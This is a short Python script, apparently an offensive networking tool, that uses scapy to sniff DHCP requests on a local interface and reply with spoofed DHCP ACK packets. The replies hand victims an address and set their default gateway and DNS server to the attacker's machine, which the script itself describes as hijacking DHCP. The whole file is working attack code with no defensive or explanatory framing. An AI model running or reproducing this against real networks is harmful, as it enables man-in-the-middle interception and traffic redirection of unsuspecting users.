#!/usr/bin/python3

import sys
import getopt
import random
from scapy.all import Ether, BOOTP, IP, UDP, DHCP, sendp, sniff, get_if_addr

dev = "enp3s0f1"
gateway = None
nameserver = None
dhcpserver = None
client_net = "192.168.1."
filter = "udp port 67"

def handle_packet(packet):
    eth = packet.getlayer(Ether)
    ip = packet.getlayer(IP)
    udp = packet.getlayer(UDP)
    bootp = packet.getlayer(BOOTP)
    dhcp = packet.getlayer(DHCP)
    dhcp_message_type = None

    if not dhcp:
        return False

    for opt in dhcp.options:
        if opt[0] == "message-type":
            dhcp_message_type = opt[1]

    # dhcp request
    if dhcp_message_type == 3:
        client_ip = client_net + str(random.randint(2,254))

        dhcp_ack = Ether(src=eth.dst, dst=eth.src) / \
                   IP(src=dhcpserver, dst=client_ip) / \
                   UDP(sport=udp.dport,
                       dport=udp.sport) / \
                   BOOTP(op=2,
                         chaddr=eth.dst,
                         siaddr=gateway,
                         yiaddr=client_ip,
                         xid=bootp.xid) / \
                   DHCP(options=[('message-type', 5),
                                 ('requested_addr', client_ip),
                                 ('subnet_mask', '255.255.255.0'),
                                 ('router', gateway),
                                 ('name_server', nameserver),
                                 ('end')])

        print("Send spoofed DHCP ACK to %s" % ip.src)
        sendp(dhcp_ack, iface=dev)


def usage():
    print(sys.argv[0] + """
    -d <dns_ip>
    -g <gateway_ip>
    -i <dev>
    -s <dhcp_ip>""")
    sys.exit(1)


try:
    cmd_opts = "d:g:i:s:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-i":
        dev = opt[1]
    elif opt[0] == "-g":
        gateway = opt[1]
    elif opt[0] == "-d":
        nameserver = opt[1]
    elif opt[0] == "-s":
        dhcpserver = opt[1]
    else:
        usage()

if not gateway:
    gateway = get_if_addr(dev)

if not nameserver:
    nameserver = gateway

if not dhcpserver:
    dhcpserver = gateway

print("Hijacking DHCP requests on %s" % (dev))
sniff(iface=dev, filter=filter, prn=handle_packet)

